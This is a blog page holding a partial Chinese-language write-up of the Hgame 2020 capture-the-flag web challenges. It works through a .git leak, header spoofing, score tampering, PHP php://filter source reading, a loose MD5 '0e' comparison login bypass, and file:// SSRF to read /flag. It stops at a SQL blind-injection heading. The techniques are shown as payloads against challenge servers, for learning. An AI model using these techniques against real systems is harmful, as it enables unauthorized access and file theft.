<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.1"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>ä¸å®Œæ•´çš„Hgame2020-CTFçš„WP - AFKL&#039;s Blog</title><meta description="2020-æ­ç”µHgameWP2020å¹´Hgameæ¯”èµ›WPç”±äºæˆ‘è¿‡äºèœé¸¡ï¼Œåªèƒ½æ‰“åˆ°week2äº†...orz"><meta property="og:type" content="blog"><meta property="og:title" content="ä¸å®Œæ•´çš„Hgame2020-CTFçš„WP"><meta property="og:url" content="https://afkl-cuit.github.io/2020/02/24/%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%9A%84Hgame2020-CTF%E7%9A%84WP/"><meta property="og:site_name" content="AFKL&#039;s Blog"><meta property="og:description" content="2020-æ­ç”µHgameWP2020å¹´Hgameæ¯”èµ›WPç”±äºæˆ‘è¿‡äºèœé¸¡ï¼Œåªèƒ½æ‰“åˆ°week2äº†...orz"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://afkl-cuit.github.io/img/og_image.png"><meta property="article:published_time" content="2020-02-24T12:08:00.000Z"><meta property="article:modified_time" content="2020-06-26T15:54:17.386Z"><meta property="article:author" content="AFKL"><meta property="article:tag" content="Blog"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://afkl-cuit.github.io/2020/02/24/%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%9A%84Hgame2020-CTF%E7%9A%84WP/"},"headline":"AFKL's Blog","image":["https://afkl-cuit.github.io/img/og_image.png"],"datePublished":"2020-02-24T12:08:00.000Z","dateModified":"2020-06-26T15:54:17.386Z","author":{"@type":"Person","name":"AFKL"},"description":"2020-æ­ç”µHgameWP2020å¹´Hgameæ¯”èµ›WPç”±äºæˆ‘è¿‡äºèœé¸¡ï¼Œåªèƒ½æ‰“åˆ°week2äº†...orz"}</script><link rel="canonical" href="https://afkl-cuit.github.io/2020/02/24/%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%9A%84Hgame2020-CTF%E7%9A%84WP/"><link rel="icon" href="https://img.moegirl.org/common/b/b7/Transparent_Akkarin.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><link rel="alternate" href="/feed.xml" title="AFKL's Blog" type="application/atom+xml">
</head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">AFKL&#039;s Blog</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/link">Link</a></div><div class="navbar-end"><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-02-24T12:08:00.000Z" title="2020-02-24T12:08:00.000Z">2020-02-24</time><span class="level-item">24 minutes read (About 3621 words)</span><span class="level-item" id="busuanzi_container_page_pv"><i class="far fa-eye"></i>&nbsp;&nbsp;<span id="busuanzi_value_page_pv">0</span> visits</span></div></div><h1 class="title is-3 is-size-4-mobile">ä¸å®Œæ•´çš„Hgame2020-CTFçš„WP</h1><div class="content"><h1 id="2020-æ­ç”µHgameWP"><a href="#2020-æ­ç”µHgameWP" class="headerlink" title="2020-æ­ç”µHgameWP"></a>2020-æ­ç”µHgameWP</h1><p>2020å¹´Hgameæ¯”èµ›WP<br>ç”±äºæˆ‘è¿‡äºèœé¸¡ï¼Œåªèƒ½æ‰“åˆ°week2äº†â€¦orz</p>
<p>[TOC]</p>
<h1 id="week-1"><a href="#week-1" class="headerlink" title="week-1"></a>week-1</h1><h2 id="Cosmos-çš„åšå®¢"><a href="#Cosmos-çš„åšå®¢" class="headerlink" title="Cosmos çš„åšå®¢"></a>Cosmos çš„åšå®¢</h2><h3 id="è€ƒå¯Ÿç‚¹"><a href="#è€ƒå¯Ÿç‚¹" class="headerlink" title="è€ƒå¯Ÿç‚¹"></a>è€ƒå¯Ÿç‚¹</h3><p><code>/.git</code>ä¿¡æ¯æ³„éœ²</p>
<h3 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><p>åœ¨é¦–é¡µä¸­æç¤ºäº†å‡ºé¢˜äººåœ¨githubä¸Šä¿å­˜äº†åŸä»£ç ã€‚<br>å°è¯•è®¿é—®<code>http://cosmos.hgame.n3ko.co/.git/config</code>ã€‚å¾—åˆ°é¡¹ç›®ä¿å­˜çš„åœ°å€ã€‚<br>æœ€ååœ¨<code>https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc/commit/f79171d9c97a1ab3ea6c97b3eb4f0e1551549853</code>çš„å†å²è®°å½•ä¸­å¾—åˆ°base64åçš„flagã€‚</p>
<pre><code>hgame{g1t_le@k_1s_danger0us_!!!!}</code></pre><h2 id="æ¥-å¤´-éœ¸-ç‹"><a href="#æ¥-å¤´-éœ¸-ç‹" class="headerlink" title="æ¥ å¤´ éœ¸ ç‹"></a>æ¥ å¤´ éœ¸ ç‹</h2><h3 id="è€ƒå¯Ÿç‚¹-1"><a href="#è€ƒå¯Ÿç‚¹-1" class="headerlink" title="è€ƒå¯Ÿç‚¹"></a>è€ƒå¯Ÿç‚¹</h3><p>è¯·æ±‚å¤´</p>
<h3 id="è¿‡ç¨‹-1"><a href="#è¿‡ç¨‹-1" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><p>ç±»ä¼¼äº2019æå®¢å¤§æŒ‘æˆ˜çš„ ç¥ç§˜çš„ä¸‰å¶è‰ ä¸€é¢˜ã€‚<br>ä½†å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é“é¢˜è¿˜è€ƒå¯Ÿäº†ä¸€ä¸ªè¯·æ±‚å‚æ•°<code>If-Unmodified-Since:&lt;time&gt;</code><br>ç®€å•æ¥è¯´ï¼Œè¿™ä¸ªå‚æ•°çš„ä½œç”¨æ˜¯è¿›è¡Œä¸€ä¸ªåˆ¤æ–­ï¼š</p>
<pre><code>å¦‚æœ (åœ¨`&lt;time&gt;`æ—¶é—´ç‚¹ä¹‹åï¼Œæ–‡ä»¶æ²¡æœ‰è¢«ä¿®æ”¹) åˆ™
    ä¸‹è½½æ–‡ä»¶
å¦åˆ™
    è¿”å›412é”™è¯¯</code></pre><p>è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒç›¸ä¼¼çš„å‚æ•°<code>If-Modified-Since:&lt;time&gt;</code><br>å’Œ<code>If-Unmodified-Since:&lt;time&gt;</code>æ˜¯åç€æ¥çš„ï¼š</p>
<pre><code>å¦‚æœ (åœ¨`&lt;time&gt;`æ—¶é—´ç‚¹ä¹‹åï¼Œæ–‡ä»¶ä¿®æ”¹è¿‡äº†) åˆ™
    ä¸‹è½½æ–‡ä»¶
å¦åˆ™
    è¿”å›304é”™è¯¯</code></pre><p>åœ¨è¿™é“é¢˜åªéœ€å°†è¯·æ±‚å¤´ä¿®æ”¹å³å¯ï¼š</p>
<pre><code>POST http://kyaru.hgame.n3ko.co/ HTTP/1.1
Host: kyaru.hgame.n3ko.co
Referer: https://vidar.club
X-Forwarded-For: 127.0.0.1
User-Agent: Cosmos/114514
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
If-Unmodified-Since: Fri, 01 Jan 1077 00:00:00 GMT
Content-Length: 0</code></pre><p>PS:è¿™é“é¢˜æœ€å¼€å§‹ä½¿ç”¨GETè¯·æ±‚å³å¯ï¼Œä½†åé¢ä¸çŸ¥é“ä¸ºä»€ä¹ˆåˆæ”¹æˆäº†POST</p>
<pre><code>hgame{W0w!Your_heads_@re_s0_many!}</code></pre><p>PSS:<br>è‡³äºä¸ºä»€ä¹ˆä¸€å®šæ˜¯<code>If-Unmodified-Since</code>â€¦<br>å¯èƒ½åªæ˜¯å‡ºé¢˜äººå•çº¯æ£€æµ‹äº†ä¸€ä¸‹è¯·æ±‚ï¼Ÿ<br>äº¦æˆ–è€…æ˜¯å…¶å®ƒæ–¹å¼ï¼Ÿå¥½å¥‡åç«¯æ˜¯æ€ä¹ˆå®ç°çš„â€¦</p>
<h2 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h2><h3 id="è€ƒå¯Ÿç‚¹-2"><a href="#è€ƒå¯Ÿç‚¹-2" class="headerlink" title="è€ƒå¯Ÿç‚¹"></a>è€ƒå¯Ÿç‚¹</h3><p>å“åº”</p>
<h3 id="è¿‡ç¨‹-2"><a href="#è¿‡ç¨‹-2" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><p>åˆæ¬¡æ‰“å¼€è¿”å›äº†403ï¼Œé¡µé¢ä¸ºnew.phpï¼Œä¸”æ‰“å¼€æ¯”è¾ƒæ…¢ï¼Œä¾¿æ€€ç–‘æœ‰é¡µé¢é‡å®šå‘ã€‚<br>å°è¯•æŠ“åŒ…å‘ç°æœç„¶å¦‚æ­¤ï¼Œå¹¶æç¤ºäº†405é”™è¯¯ã€‚è¯´æ˜è¯·æ±‚æ–¹å¼æœ‰è¯¯ï¼Œå°è¯•POSTè¯·æ±‚ã€‚<br>è¯·æ±‚åå‡ºç°è¿™æ ·ä¸€æ®µè¯(å·²æ ¼å¼åŒ–)ï¼š</p>
<pre><code>&lt;center&gt;
&lt;h1&gt;äººé¸¡éªŒè¯&lt;/h1&gt;
&lt;br&gt;
&lt;br&gt;
ç›®å‰å®ƒåªæ”¯æŒé€šè¿‡urlæäº¤å‚æ•°æ¥è®¡ç®—ä¸¤ä¸ªæ•°çš„ç›¸åŠ ï¼Œå‚æ•°ä¸ºa
&lt;br&gt;
&lt;br&gt;
ç°åœ¨,éœ€è¦è®©ç»“æœä¸º10
&lt;/center&gt;</code></pre><p>åˆ™æäº¤ï¼š</p>
<pre><code>POST http://codeworld.hgame.day-day.work/?a=5%2B5 HTTP/1.1
Host: codeworld.hgame.day-day.work
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1</code></pre><p>å³å¯è·å¾—flag<br>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€èˆ¬æµè§ˆå™¨é‡Œä¼šæŠŠ<code>+</code>è®¤ä¸ºæ˜¯ç©ºæ ¼ï¼Œè¿™æ—¶å€™æäº¤<code>%2B</code>å³å¯ã€‚</p>
<pre><code>hgame{C0d3_1s_s0_S@_sO_C0ol!}</code></pre><h2 id="ğŸ”å°¼æ³°ç«"><a href="#ğŸ”å°¼æ³°ç«" class="headerlink" title="ğŸ”å°¼æ³°ç«"></a>ğŸ”å°¼æ³°ç«</h2><h3 id="è€ƒå¯Ÿç‚¹-3"><a href="#è€ƒå¯Ÿç‚¹-3" class="headerlink" title="è€ƒå¯Ÿç‚¹"></a>è€ƒå¯Ÿç‚¹</h3><p>æŠ“åŒ…æ”¹åŒ…<br>(jsä»£ç å®¡è®¡)</p>
<h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><p>åœ¨æ¸¸æˆè¿‡ç¨‹ä¸­è¿›è¡ŒæŠ“åŒ…ï¼Œå‘ç°äº†ä¸€æ¡å¥‡æ€ªçš„è¯·æ±‚</p>
<pre><code>POST http://cxk.hgame.wz22.cc/submit HTTP/1.1
Host: cxk.hgame.wz22.cc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 42

score=400|68ae153a367158c60103d39d867c365a</code></pre><p>è¿™é‡Œscore=400ä¾¿æ˜¯æˆ‘è¿™æ¬¡æ¸¸æˆçš„åˆ†æ•°ï¼Œåé¢çš„ä¸€ä¸²æ•°æ®ä¹‹åçš„ä»£ç å®¡è®¡è§£é‡Šã€‚<br>æˆ‘ä»¬è¿›è¡Œæ”¹åŒ…ï¼Œå°†400æ”¹ä¸ºä»–æ‰€è¦æ±‚çš„30000ä¾¿ä¼šå¾—åˆ°<code>alert</code>çš„flagäº†ã€‚</p>
<pre><code>hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!}</code></pre><h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><p>è¿™é‡Œæˆ‘ä»¬å¯¹æ¸¸æˆçš„jsä»£ç è¿›è¡Œå®¡è®¡<br>åœ¨<code>game.js</code>ä¸­å‘ç°è¿™æ ·ä¸€æ®µï¼ˆå·²æ ¼å¼åŒ–ï¼‰</p>
<pre><code>gameOver() 
{
    let po = &quot;ejIy&quot;;
    let rt = po + &quot;LmNj&quot;;
    let rou = &quot;L3N1Ym&quot;;
    let sche = &quot;aHR0c&quot;;
    let k = &quot;c2Nv&quot;;
    let me = sche + &quot;DovL2N&quot;;
    clearInterval(this.timer)
    this.context.clearRect(0, 0, this.canvas.width, this.canvas.height)
    let stamp = md5(Date.parse(new Date()) / 1000); 
    this.globalScore = this.globalScore + this.storageScore; 
    this.context.font = &apos;32px Microsoft YaHei&apos;
    this.context.fillStyle = &apos;#000&apos;
    this.context.fillText(&apos;CXKï¼Œä½ çƒæ‰äº†ï¼å¾—åˆ†ï¼š&apos; + this.globalScore, 404, 226)
    $(&quot;#ballspeedset&quot;).removeAttr(&quot;disabled&quot;); let s = this.globalScore;
    (
        function () 
        { 
            let getU = me + &quot;4ay5oZ&quot;; 
            let rl = getU + &quot;2FtZS53&quot;; 
            let te = rou + &quot;1pdA&quot;; 
            let ey = k + &quot;cmU=&quot;; 
            $.post(atob(rl + rt + te), atob(ey) + &quot;=&quot; + s + &quot;|&quot; + stamp, function (data) { alert(data); }) 
        }
    )(); 
    this.globalScore = 0;
}</code></pre><p>å…¶ä¸­</p>
<pre><code>    let po = &quot;ejIy&quot;;
    let rt = po + &quot;LmNj&quot;;
    let rou = &quot;L3N1Ym&quot;;
    let sche = &quot;aHR0c&quot;;
    let k = &quot;c2Nv&quot;;
    let me = sche + &quot;DovL2N&quot;;
    let getU = me + &quot;4ay5oZ&quot;; 
    let rl = getU + &quot;2FtZS53&quot;; 
    let te = rou + &quot;1pdA&quot;; 
    let ey = k + &quot;cmU=&quot;; 
    $.post(atob(rl + rt + te), atob(ey) + &quot;=&quot; + s + &quot;|&quot; + stamp, function (data) { alert(data); }) 

//å…¶ä¸­(é•¿è§è¯†äº†ï¼ˆï¼ˆï¼ˆ)
//rl=getUrl, rt=port, te=route, ey=key
//base64è§£ç åå‘ç°å®Œæ•´çš„postæ–¹æ³•ä¸º
$.post(&quot;http://cxk.hgame.wz22.cc/submit&quot;, &quot;score&quot; + &quot;=&quot; + s + &quot;|&quot; + stamp, function (data) { alert(data); }) 
//å³å‘ http://cxk.hgame.wz22.cc/submit å‘é€æ•°æ®score=s|stampï¼Œä¹‹åè¿”å›çš„æ•°æ®ä¼šä»¥alertçš„å½¢å¼è¾“å‡º

//å…¶ä¸­sä¸ºæˆ‘ä»¬çš„æ¸¸æˆåˆ†æ•°
//stampä¸º
let stamp = md5(Date.parse(new Date()) / 1000); </code></pre><p>åœ¨åˆ†æå®Œä»£ç åï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ä¿®æ”¹jsæºç ï¼Œä¼ªé€ æ•°æ®ï¼Œè·å¾—flag</p>
<pre><code>hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!}</code></pre><h1 id="week-2"><a href="#week-2" class="headerlink" title="week-2"></a>week-2</h1><h2 id="Cosmosçš„åšå®¢åå°"><a href="#Cosmosçš„åšå®¢åå°" class="headerlink" title="Cosmosçš„åšå®¢åå°"></a>Cosmosçš„åšå®¢åå°</h2><h3 id="è€ƒå¯Ÿç‚¹-4"><a href="#è€ƒå¯Ÿç‚¹-4" class="headerlink" title="è€ƒå¯Ÿç‚¹"></a>è€ƒå¯Ÿç‚¹</h3><p>é€»è¾‘æ¼æ´<br>ä¸€äº›phpçš„å‡½æ•°ç¼ºé™·</p>
<h3 id="è¿‡ç¨‹-3"><a href="#è¿‡ç¨‹-3" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><p>åœ¨æœ€å¼€å§‹å¯ä»¥å¾—åˆ°ä¸€ä¸ªç™»å½•é¡µé¢ã€‚éšå³å¯ä»¥å‘ç°urlç–‘ä¼¼å¯ä»¥è¿›è¡Œæ–‡ä»¶åŒ…å«ã€‚<br><a href="http://cosmos-admin.hgame.day-day.work/index.php">http://cosmos-admin.hgame.day-day.work/index.php</a><strong>?action=login.php</strong><br>å°†<code>login.php</code>æ›¿æ¢ä¸ºæ ¹ç›®å½•ä¸‹çš„<code>/flag</code>è¿”å›äº†<code>Hacker get out</code>åº”è¯¥æ˜¯è¢«è¿‡æ»¤äº†ã€‚<br>å°è¯•ç”¨phpä¼ªåè®®ä¸­çš„<code>php://filter/read</code>æ¥è¿›è¡Œphpæºç çš„è¯»å–ã€‚<br>å¾—åˆ°<code>login.php</code>å’Œ<code>index.php</code>çš„æºç ã€‚åœ¨<code>login.php</code>æºç é‡Œé¡ºè—¤æ‘¸ç“œå¾—åˆ°äº†<code>admin.php</code>æ–‡ä»¶æºç ã€‚åœ¨å…¶ä¸­è¿˜çŸ¥é“äº†ä¸€ä¸ª<code>config.php</code>æ–‡ä»¶ï¼Œä½†è¢«è¿‡æ»¤äº†ï¼Œæ— æ³•è¯»å–ã€‚<br>PSï¼šæ–¹ä¾¿èµ·è§è¿™é‡Œåªå±•ç¤ºphpæºç ã€‚</p>
<p><strong>login.php</strong></p>
<pre><code>&lt;?php
include &quot;config.php&quot;;
session_start();

//Only for debug
if (DEBUG_MODE){
    if(isset($_GET[&apos;debug&apos;])) {
        $debug = $_GET[&apos;debug&apos;];
        if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) {
            die(&quot;args error!&quot;);
        }
        eval(&quot;var_dump($$debug);&quot;);
    }
}

if(isset($_SESSION[&apos;username&apos;])) {
    header(&quot;Location: admin.php&quot;);
    exit();
}
else {
    if (isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;])) {
        if ($admin_password == md5($_POST[&apos;password&apos;]) &amp;&amp; $_POST[&apos;username&apos;] === $admin_username){
            $_SESSION[&apos;username&apos;] = $_POST[&apos;username&apos;];
            header(&quot;Location: admin.php&quot;);
            exit();
        }
        else {
            echo &quot;??Â¨??Â·???????Ë‰?? ?Ã©??Ã¨Ë‰Ë‰&quot;;
        }
    }
}
?&gt;</code></pre><p><strong>index.php</strong></p>
<pre><code>&lt;?php
error_reporting(0);
session_start();

if(isset($_SESSION[&apos;username&apos;])) {
    header(&quot;Location: admin.php&quot;);
    exit();
}

$action = @$_GET[&apos;action&apos;];
$filter = &quot;/config|etc|flag/i&quot;;

if (isset($_GET[&apos;action&apos;]) &amp;&amp; !empty($_GET[&apos;action&apos;])) {
    if(preg_match($filter, $_GET[&apos;action&apos;])) {
        echo &quot;Hacker get out!&quot;;
        exit();
    }
        include $action;
}
elseif(!isset($_GET[&apos;action&apos;]) || empty($_GET[&apos;action&apos;])) {
    header(&quot;Location: ?action=login.php&quot;);
    exit();
}</code></pre><p><strong>admin.php</strong></p>
<pre><code>&lt;?php
include &quot;config.php&quot;;
session_start();
if(!isset($_SESSION[&apos;username&apos;])) {
    header(&apos;Location: index.php&apos;);
    exit();
}

function insert_img() {
    if (isset($_POST[&apos;img_url&apos;])) {
        $img_url = @$_POST[&apos;img_url&apos;];
        $url_array = parse_url($img_url);
        if (@$url_array[&apos;host&apos;] !== &quot;localhost&quot; &amp;&amp; $url_array[&apos;host&apos;] !== &quot;timgsa.baidu.com&quot;) {
            return false;
        }   
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $img_url);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        $res = curl_exec($c);
        curl_close($c);
        $avatar = base64_encode($res);

        if(filter_var($img_url, FILTER_VALIDATE_URL)) {
            return $avatar;
        }
    }
    else {
        return base64_encode(file_get_contents(&quot;static/logo.png&quot;));
    }
}
?&gt;

&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static/error.jpg&quot;)); ?&gt;</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œä»<code>index.php</code>çš„æ–‡ä»¶åŒ…å«æ¥è·å–flagæ˜¯ä¸å¤ªå¯èƒ½äº†ï¼Œåªèƒ½æ‰¾å…¶å®ƒæ–¹æ³•ã€‚<br>åœ¨<code>admin.php</code>ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªåˆ©ç”¨base64æ¥è¯»å–è¿œç¨‹å’Œæœ¬åœ°å›¾ç‰‡çš„è„šæœ¬ã€‚æˆ–è®¸æˆ‘ä»¬å¯ä»¥å¯¹å…¶è¿›è¡Œåˆ©ç”¨ã€‚ä½†é¦–å…ˆæˆ‘ä»¬éœ€è¦ç”¨ç®¡ç†å‘˜è´¦å·ç™»å½•ä¸Šå»ã€‚<br>éšåä¾¿å¯ä»¥æ‰¾åˆ°ç™»å½•éªŒè¯çš„ä»£ç ï¼š</p>
<pre><code>if ($admin_password == md5($_POST[&apos;password&apos;]) &amp;&amp; $_POST[&apos;username&apos;] === $admin_username)
{
    $_SESSION[&apos;username&apos;] = $_POST[&apos;username&apos;];
    header(&quot;Location: admin.php&quot;);
    exit();
}
else 
{
    echo &quot;??Â¨??Â·???????Ë‰?? ?Ã©??Ã¨Ë‰Ë‰&quot;;
}</code></pre><p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±è¦æƒ³åŠæ³•å¾—åˆ°ä¸¤ä¸ªå˜é‡çš„å€¼<code>$admin_password</code>ï¼Œ<code>admin_username</code>ã€‚<br>è¿˜ä¸éš¾æ³¨æ„åˆ°åœ¨<code>login.php</code>ä¸­æœ‰ä¸€ä¸ªdebug-modeï¼Œåªè¦è¾“å…¥å˜é‡ï¼Œä»–å°±ä¼šæ‰§è¡Œeval(â€œvar_dump($$debug);â€);æ¥æ˜¾ç¤ºå˜é‡ã€‚è¿™æ­£æ˜¯æˆ‘ä»¬éœ€è¦çš„ã€‚<br>å¾—åˆ°äº†è´¦å·å’Œmd5åçš„å¯†ç ï¼š</p>
<pre><code>username:Cosmos!
MD5(password):0e114902927253523756713132279690</code></pre><p>å¯ä»¥çœ‹åˆ°MD5åçš„å¯†ç æ˜¯<code>0e+æ•°å­—</code>ï¼Œä¸”æ¯”è¾ƒæ—¶ä¹Ÿä¸æ˜¯ä¸¥æ ¼æ¯”è¾ƒï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡ã€‚<br>ç™»å½•åæ¥åˆ°<code>admin.php</code>é¡µé¢ï¼Œåˆ†æphpæºç ï¼Œå¾—åˆ°å‡ ä¸ªé‡è¦å‡½æ•°ï¼š</p>
<pre><code>filter_var($img_url, FILTER_VALIDATE_URL);
//è¿™æ˜¯ä¸€ä¸ªè¿‡æ»¤å™¨å‡½æ•°ï¼Œé€šè¿‡è¿‡æ»¤å™¨æ¥è¿”å›è¿‡æ»¤çš„éƒ¨åˆ†ã€‚
parse_url($img_url);
/*
è¿™ä¸ªå‡½æ•°æ˜¯å°†ä¸€ä¸ªurlæ‹†è§£ä¸ºå‡ ä¸ªéƒ¨åˆ†ï¼Œå¦‚ä¸‹çš„urlä¼šè¢«æ‹†è§£ä¸ºå‡ ä¸ªéƒ¨åˆ†ï¼š
http://username:password@hostname/path?arg=value#anchor
Array
(
    [scheme] =&gt; http
    [host] =&gt; hostname
    [user] =&gt; username
    [pass] =&gt; password
    [path] =&gt; /path
    [query] =&gt; arg=value
    [fragment] =&gt; anchor
)
*/</code></pre><p>åœ¨<code>admin.php</code>ï¼Œä¸­æœ‰è¿™ä¹ˆä¸€æ®µä»£ç </p>
<pre><code>$img_url = @$_POST[&apos;img_url&apos;];
$url_array = parse_url($img_url);
...
if (@$url_array[&apos;host&apos;] !== &quot;localhost&quot; &amp;&amp; $url_array[&apos;host&apos;] !== &quot;timgsa.baidu.com&quot;) 
{
    return false;
} </code></pre><p>å®ƒæ˜ç¡®è¦æ±‚äº†æ–‡ä»¶çš„hostæ¥è‡ª<code>localhost</code>æˆ–<code>timgsa.baidu.com</code>ï¼Œå¦åˆ™ä¼šå¯¼è‡´å‡½æ•°è¿”å›<code>false</code>ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨fileåè®®ä½¿æ¡ä»¶ç¬¦åˆï¼š<br><code>file://localhost/flag</code><br>PSï¼šç†è®ºä¸Šï¼Œfileåè®®ä¹Ÿæ˜¯æœ‰hostéƒ¨åˆ†çš„ï¼Œä½†è¿™ä¸ªåè®®æœ¬èº«å°±æ˜¯è§£ææœ¬åœ°æ–‡ä»¶çš„ï¼Œæ‰€ä»¥è¢«çœç•¥äº†ã€‚ä½†è¿˜æ˜¯éœ€è¦æ³¨æ„hostéƒ¨åˆ†å¿…é¡»æ˜¯localhostï¼Œå¦åˆ™ä¼šå‡ºé”™ã€‚<br>PSSï¼šåœ¨æˆ‘windowsæœ¬åœ°ç¯å¢ƒä¸­ä½¿ç”¨ä»¥ä¸‹phpè„šæœ¬ï¼š</p>
<pre><code>&lt;?php
$url = &apos;file://localhost/D:/114514.txt&apos;;
print_r(parse_url($url));
$c = curl_init();
curl_setopt($c, CURLOPT_URL, $url);
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
$res = curl_exec($c);
curl_close($c);
if(filter_var($url, FILTER_VALIDATE_URL))
{
    print(&apos;working&apos;);
    echo $res;
}
?&gt;

/*
Output:
Array
(
    [scheme] =&gt; file
    [host] =&gt; localhost
    [path] =&gt; /D:/114514.txt
)
working

å½“$url=&apos;file:///D:/114514.txt&apos;;æ—¶
Array
(
    [scheme] =&gt; file
    [path] =&gt; /D:/114514.txt
)
workingã„ã„ã‚ˆï¼ã“ã„ã‚ˆï¼
*/</code></pre><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆé“¾æ¥è§£ææˆåŠŸäº†ï¼Œä½†æ²¡æœ‰<code>114514.txt</code>çš„æ–‡ä»¶å†…å®¹ã€‚åœ¨5.2.17å’Œ7.3.4çš„ç¯å¢ƒéƒ½è¯•è¿‡äº†ï¼Œéƒ½ä¸è¡Œâ€¦ä½†åœ¨é¢˜ç›®ä¸­ä½¿ç”¨<code>file://localhost/flag</code>æ˜¯å¯ä»¥å¾—åˆ°æ–‡ä»¶å†…å®¹çš„â€¦<br>æ€»ä¹‹å¾—åˆ°äº†flagï¼š</p>
<pre><code>hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}</code></pre><h2 id="Cosmosçš„ç•™è¨€æ¿-1"><a href="#Cosmosçš„ç•™è¨€æ¿-1" class="headerlink" title="Cosmosçš„ç•™è¨€æ¿-1"></a>Cosmosçš„ç•™è¨€æ¿-1</h2><h3 id="è€ƒå¯Ÿç‚¹-5"><a href="#è€ƒå¯Ÿç‚¹-5" class="headerlink" title="è€ƒå¯Ÿç‚¹"></a>è€ƒå¯Ÿç‚¹</h3><p>sqlæ—¶é—´ç›²æ³¨ï¼ˆæˆ–è®¸ï¼Ÿ</p>
